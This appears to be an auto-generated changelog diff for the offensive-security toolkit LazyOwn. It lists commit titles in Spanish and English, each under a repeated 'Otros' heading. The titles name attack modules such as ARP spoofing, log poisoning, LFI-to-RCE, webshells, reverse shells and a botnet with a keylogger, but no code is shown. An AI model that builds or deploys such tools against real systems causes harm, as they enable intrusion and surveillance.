+
+  *   * LazyOwn ArpSpoofing [;,;]
+
+
+### Otros
+
+### Otros
+
+  *   * Update README.md
+
+
+### Otros
+
+### Otros
+
+  *   * Lazy path hijacking :)
+
+
+### Otros
+
+### Otros
+
+  *   * Lazy msfvenom reverse :)
+
+
+### Otros
+
+### Otros
+
+  *   * Lazy Log more lfi list :)
+
+
+### Otros
+
+### Otros
+
+  *   * Lazy Log Poisonig more poison bro
+
+
+### Otros
+
+### Otros
+
+  *   * Lazy Log Poisonig in ssh first aproach
+
+
+### Otros
+
+### Otros
+
+  *   * Lazy Log Poisonig
+
+
+### Otros
+
+### Otros
+
+  *   * Lazy Log Poisonig
+
+
+### Otros
+
+### Otros
+
+  *   * Lazy Log Poisonig
+
+
+### Otros
+
+### Otros
+
+  *   * Delete lazylogpisoning.py
+
+
+### Otros
+
+### Otros
+
+  *   * Merge branch 'main' of https://github.com/grisuno/LazyOwn
+
+
+### Otros
+
+### Otros
+
+  *   * Update app.py
+
+
+### Otros
+
+### Otros
+
+  *   * Lazy Log Poisonig
+
+
+### Otros
+
+### Otros
+
+  *   * fix install
+
+
+### Otros
+
+### Otros
+
+  *   * Update lazypwnkit.py
+
+
+### Otros
+
+### Otros
+
+  *   * Create lazyssh.py
+
+
+### Otros
+
+### Otros
+
+  *   * #!/usr/bin/env python3  #_*_ coding: utf8 _*_
+
+
+### Otros
+
+### Otros
+
+  *   * Merge branch 'main' of https://github.com/grisuno/LazyOwn
+
+
+### Otros
+
+### Otros
+
+  *   * add #!/usr/bin/env python3  #_*_ coding: utf8 _*_
+
+
+### Otros
+
+### Otros
+
+  *   * Update README.md
+
+
+### Otros
+
+### Otros
+
+  *   * Update lazylfi2rce.py
+
+
+### Otros
+
+### Otros
+
+  *   * dic
+
+
+### Otros
+
+### Otros
+
+  *   * Update app.py
+
+
+### Otros
+
+### Otros
+
+  *   * dos2unix
+
+
+### Otros
+
+### Otros
+
+  *   * Update README.md
+
+
+### Otros
+
+### Otros
+
+  *   * better implementation
+
+
+### Otros
+
+### Otros
+
+  *   * tentativas de herramientas nuevas
+
+
+### Otros
+
+### Otros
+
+  *   * google analytics
+
+
+### Otros
+
+### Otros
+
+  *   * dos2unix
+
+
+### Otros
+
+### Otros
+
+  *   * Update index.html
+
+
+### Otros
+
+### Otros
+
+  *   * Merge branch 'main' of https://github.com/grisuno/LazyOwn
+
+
+### Otros
+
+### Otros
+
+  *   * Update .gitignore
+
+
+### Otros
+
+### Otros
+
+  *   * delete python librarys
+
+
+### Otros
+
+### Otros
+
+  *   * use of python3 env
+
+
+### Otros
+
+### Otros
+
+  *   * use of python3 env
+
+
+### Otros
+
+### Otros
+
+  *   * Update index.html
+
+
+### Otros
+
+### Otros
+
+  *   * Update index.html
+
+
+### Otros
+
+### Otros
+
+  *   * Update index.html
+
+
+### Otros
+
+### Otros
+
+  *   * Update index.html
+
+
+### Otros
+
+### Otros
+
+  *   * Update index.html
+
+
+### Otros
+
+### Otros
+
+  *   * Update README.md
+
+
+### Otros
+
+### Otros
+
+  *   * Update index.html
+
+
+### Otros
+
+### Otros
+
+  *   * Update index.html
+
+
+### Otros
+
+### Otros
+
+  *   * banner
+
+
+### Otros
+
+### Otros
+
+  *   * nueva shell zsh :)
+
+
+### Otros
+
+### Otros
+
+  *   * index nuevo
+
+
+### Otros
+
+### Otros
+
+  *   * Create index.html
+
+
+### Otros
+
+### Otros
+
+  *   * Update app.py
+
+
+### Otros
+
+### Otros
+
+  *   * Update app.py
+
+
+### Otros
+
+### Otros
+
+  *   * imlementacion de libreria pwn
+
+
+### Otros
+
+### Otros
+
+  *   * new tags
+
+
+### Otros
+
+### Otros
+
+  *   * Merge branch 'main' of https://github.com/grisuno/LazyOwn
+
+
+### Otros
+
+### Otros
+
+  *   * Create lazygalazy.py
+
+
+### Otros
+
+### Otros
+
+  *   * Update app.py
+
+
+### Otros
+
+### Otros
+
+  *   * Create lazyclonewars.sh
+
+
+### Otros
+
+### Otros
+
+  *   * Update README.md
+
+
+### Otros
+
+### Otros
+
+  *   * Merge branch 'main' of https://github.com/grisuno/LazyOwn
+
+
+### Otros
+
+### Otros
+
+  *   * Update lazywebshell.sh
+
+
+### Otros
+
+### Otros
+
+  *   * Update README.md
+
+
+### Otros
+
+### Otros
+
+  *   * Update app.py
+
+
+### Otros
+
+### Otros
+
+  *   * Create lazywebshell.sh
+
+
+### Otros
+
+### Otros
+
+  *   * mejora en la webshell de python
+
+
+### Otros
+
+### Otros
+
+  *   * webshells
+
+
+### Otros
+
+### Otros
+
+  *   * Merge branch 'main' of https://github.com/grisuno/LazyOwn
+
+
+### Otros
+
+### Otros
+
+  *   * comentarios necesarios
+
+
+### Otros
+
+### Otros
+
+  *   * Update README.md
+
+
+### Otros
+
+### Otros
+
+  *   * return jsonify({"error": "error"}), 500
+
+
+### Otros
+
+### Otros
+
+  *   * Fix code scanning alert - Information exposure through an exception #16
+
+
+### Otros
+
+### Otros
+
+  *   * Fix code scanning alert - Flask app is run in debug mode #17
+
+
+### Otros
+
+### Otros
+
+  *   * py2elf experimental
+
+
+### Otros
+
+### Otros
+
+  *   * nueva interfaz web experimental
+
+
+### Otros
+
+### Otros
+
+  *   * Update app.py
+
+
+### Otros
+
+### Otros
+
+  *   * nuevo bot de investigacion
+
+
+### Otros
+
+### Otros
+
+  *   * remove keys xD
+
+
+### Otros
+
+### Otros
+
+  *   * new honeypot
+
+
+### Otros
+
+### Otros
+
+  *   * Merge branch 'main' of https://github.com/grisuno/LazyOwn
+
+
+### Otros
+
+### Otros
+
+  *   * New BotNet with Keylogger
+
+
+### Otros
+
+### Otros
+
+  *   * Merge pull request #13 from grisuno/grisuno-patch-7
+
+
+### Otros
+
+### Otros
+
+  *   * Update README.md
+
+
+### Otros
+
+### Otros
+
+  *   * Create pull_request_template.md
+
+
+### Otros
+
+### Otros
+
+  *   * Update README.md
+
+
+### Otros
+
+### Otros
+
+  *   * Create pull_request_template.md
+
+
+### Otros
+
+### Otros
+
+  *   * device to sniff parametric
+
+
+### Otros
+
+### Otros
+
+  *   * netbios atack
+
+
+### Otros
+
+### Otros
+
+  *   * Update lazynetbios.py
+
+
+### Otros
+
+### Otros
+
+  *   * update req*
+
+
+### Otros
+
+### Otros
+
+  *   * Merge branch 'main' of https://github.com/grisuno/LazyOwn
+
+
+### Otros
+
+### Otros
+
+  *   * new netbios atack mode
+
+
+### Otros
+
+### Otros
+
+  *   * Update README.md
+
+
+### Otros
+
+### Otros
+
+  *   * del
+
+
+### Otros
+
+### Otros
+
+  *   * mejoras en ncurses
+
+
+### Otros
+
+### Otros
+
+  *   * Update lazysniff.py
+
+
+### Otros
+
+### Otros
+
+  *   * nuevo modulo de sniffer
+
+
+### Otros
+
+### Otros
+
+  *   * Update lazyownclient.py
+
+
+### Otros
+
+### Otros
+
+  *   * Merge branch 'main' of https://github.com/grisuno/LazyOwn
+
+
+### Otros
+
+### Otros
+
+  *   * new command fixperm
+
+
+### Otros
+
+### Otros
+
+  *   * Update README.md
+
+
+### Otros
+
+### Otros
+
+  *   * nuevo modulo de gathering
+
+
+### Otros
+
+### Otros
+
+  *   * Update search.py
+
+
+### Otros
+
+### Otros
+
+  *   * new comand payload :)
+
+
+### Otros
+
+### Otros
+
+  *   * nueva estructura de directorios
+
+
+### Otros
+
+### Otros
+
+  *   * Update app.py
+
+
+### Otros
+
+### Otros
+
+  *   * Update README.md
+
+
+### Otros
+
+### Otros
+
+  *   * Update lazyownserver.py
+
+
+### Otros
+
+### Otros
+
+  *   * Merge pull request #10 from grisuno/grisuno-patch-6
+
+
+### Otros
+
+### Otros
+
+  *   * Update lazyownclient.py
+
+
+### Otros
+
+### Otros
+
+  *   * Update README.md
+
+
+### Otros
+
+### Otros
+
+  *   * Update requirements.txt
+
+
+### Otros
+
+### Otros
+
+  *   * Update app.py
+
+
+### Otros
+
+### Otros
+
+  *   * Create lazyownclient.py
+
+
+### Otros
+
+### Otros
+
+  *   * Create lazyownserver.py
+
+
+### Otros
+
+### Otros
+
+  *   * Update app.py
+
+
+### Otros
+
+### Otros
+
+  *   * Update README.md
+
+
+### Otros
+
+### Otros
+
+  *   * Update app.py
+
+
+### Otros
+
+### Otros
+
+  *   * Update lazynmap.sh
+
+
+### Otros
+
+### Otros
+
+  *   * Update requirements.txt
+
+
+### Otros
+
+### Otros
+
+  *   * Update app.py
+
+
+### Otros
+
+### Otros
+
+  *   * Merge pull request #8 from grisuno/grisuno-patch-6
+
+
+### Otros
+
+### Otros
+
+  *   * Update requirements.txt
+
+
+### Otros
+
+### Otros
+
+  *   * Update README.md
+
+
+### Otros
+
+### Otros
+
+  *   * Update app.py
+
+
+### Otros
+
+### Otros
+
+  *   * Create lazyown_metaextract0r.py
+
+
+### Otros
+
+### Otros
+
+  *   * Update README.md
+
+
+### Otros
+
+### Otros
+
+  *   * Update lazygptcli.py
+
+
+### Otros
+
+### Otros
+
+  *   * Update README.md
+
+
+### Otros
+
+### Otros
+
+  *   * Update lazygptcli.py
+
+
+### Otros
+
+### Otros
+
+  *   * Update lazygptcli.py
+
+
+### Otros
+
+### Otros
+
+  *   * Update README.md
+
+
+### Otros
+
+### Otros
+
+  *   * Update app.py
+
+
+### Otros
+
+### Otros
+
+  *   * Update README.md
+
+
+### Otros
+
+### Otros
+
+  *   * Update README.md
+
+
+### Otros
+
+### Otros
+
+  *   * Update README.md
+
+
+### Otros
+
+### Otros
+
+  *   * Create app.py
+
+
+### Otros
+
+### Otros
+
+  *   * Update README.md
+
+
+### Otros
+
+### Otros
+
+  *   * Update README.md
+
+
+### Otros
+
+### Otros
+
+  *   * Create lazyown_bprfuzzer.py
+
+
+### Otros
+
+### Otros
+
+  *   * Update lazygptcli.py
+
+
+### Otros
+
+### Otros
+
+  *   * Merge pull request #6 from grisuno/grisuno-patch-5
+
+
+### Otros
+
+### Otros
+
+  *   * Update update_db.sh
+
+
+### Otros
+
+### Otros
+
+  *   * Update update_db.sh
+
+
+### Otros
+
+### Otros
+
+  *   * Update requirements.txt
+
+
+### Otros
+
+### Otros
+
+  *   * Update README.md
+
+
+### Otros
+
+### Otros
+
+  *   * Update README.md
+
+
+### Otros
+
+### Otros
+
+  *   * Update lazygptcli.py
+
+
+### Otros
+
+### Otros
+
+  *   * Create lazygptcli.py
+
+
+### Otros
+
+### Otros
+
+  *   * Update README.md
+
+
+### Otros
+
+### Otros
+
+  *   * Update README.md
+
+
+### Otros
+
+### Otros
+
+  *   * Update README.md
+
+
+### Otros
+
+### Otros
+
+  *   * Create lazynmap.sh
+
+
+### Otros
+
+### Otros
+
+  *   * Update lazyreverse_shell.sh
+
+
+### Otros
+
+### Otros
+
+  *   * Merge pull request #5 from grisuno/grisuno-patch-4
+
+
+### Otros
+
+### Otros
+
+  *   * Update README.md
+
+
+### Otros
+
+### Otros
+
+  *   * Update README.md
+
+
+### Otros
+
+### Otros
+
+  *   * Create lazyreverse_shell.sh
+
+
+### Otros
+
+### Otros
+
+  *   * Update README.md
+
+
+### Otros
+
+### Otros
+
+  *   * Update requirements.txt
+
+
+### Otros
+
+### Otros
+
+  *   * Update README.md
+
+
+### Otros
+
+### Otros
+
+  *   * Update LazyOwnExplorer.py
+
+
+### Otros
+
+### Otros
+
+  *   * Update README.md
+
+
+### Otros
+
+### Otros
+
+  *   * Create LazyOwnExplorer.py
+
+
+### Otros
+
+### Otros
+
+  *   * Update README.md
+
+
+### Otros
+
+### Otros
+
+  *   * Merge pull request #4 from grisuno/grisuno-patch-3
+
+
+### Otros
+
+### Otros
+
+  *   * Create requirements.txt
+
+
+### Otros
+
+### Otros
+
+  *   * Create CODE_OF_CONDUCT.md
+
+
+### Otros
+
+### Otros
+
+  *   * Update issue templates
+
+
+### Otros
+
+### Otros
+
+  *   * Create SECURITY.md
+
+
+### Otros
+
+### Otros
+
+  *   * Create CONTRIBUTING.md
+
+
+### Otros
+
+### Otros
+
+  *   * Merge pull request #3 from grisuno/grisuno-patch-2
+
+
+### Otros
+
+### Otros
+
+  *   * Create LICENSE
+
+
+### Otros
+
+### Otros
+
+  *   * Merge pull request #1 from grisuno/grisuno-patch-1
+
+
+### Otros
+
+### Otros
+
+  *   * Update lazyown.py
+
+
+### Otros
+
+### Otros
+
+  *   * Update README.md
+
+
+### Otros
+
+### Otros
+
+  *   * Update README.md
+
+
+### Otros
+
+### Otros
+
+  *   * Create lazyatack.sh
+
+
+### Otros
+
+### Otros
+
+  *   * Update README.md
+
+
+### Otros
+
+### Otros
+
+  *   * Update README.md
+
+
+### Otros
+
+### Otros
+
+  *   * Create lazysearch.py
+
+
+### Otros
+
+### Otros
+
+  *   * Update README.md
+
+
+### Otros
+
+### Otros
+
+  *   * Update README.md
+
+
+### Otros
+
+### Otros
+
+  *   * Update update_db.sh
+
+
+### Otros
+
+### Otros
+
+  *   * Update update_db.sh
+
+
+### Otros
+
+### Otros
+
+  *   * Update README.md
+
+
+### Otros
+
+### Otros
+
+  *   * ██╗      █████╗ ███████╗██╗   ██╗ ██████╗ ██╗    ██╗███╗   ██╗ ██║     ██╔══██╗╚══███╔╝╚██╗ ██╔╝██╔═══██╗██║    ██║████╗  ██║ ██║     ███████║  ███╔╝  ╚████╔╝ ██║   ██║██║ █╗ ██║██╔██╗ ██║ ██║     ██╔══██║ ███╔╝    ╚██╔╝  ██║   ██║██║███╗██║██║╚██╗██║ ███████╗██║  ██║███████╗   ██║   ╚██████╔╝╚███╔███╔╝██║ ╚████║ ╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝    ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═══╝
+
+
+### Otros
+
+### Otros
+
+  *   * Create update_db.sh
+
+
+### Otros
+
+### Otros
+
+  *   * Update README.md
+
+
+### Otros
+
+### Otros
+
+  *   * Add files via upload
+
+
+### Otros
+
+### Otros
+
+  *   * Create lazyown.py
+
+
+### Otros
+
+### Otros
+
+  *   * Create bin_data_relevant.csv
+
+
+### Otros
+
+### Otros
+
+  *   * Create bin_data.csv
+
+
+### Otros
+
+### Otros
+
+  *   * Create detailed_search.py
+
+
+### Otros
+
+### Otros
+
+  *   * Create search.py
+
+
+### Otros
+
+### Otros
+
+  *   * Update README.md
+
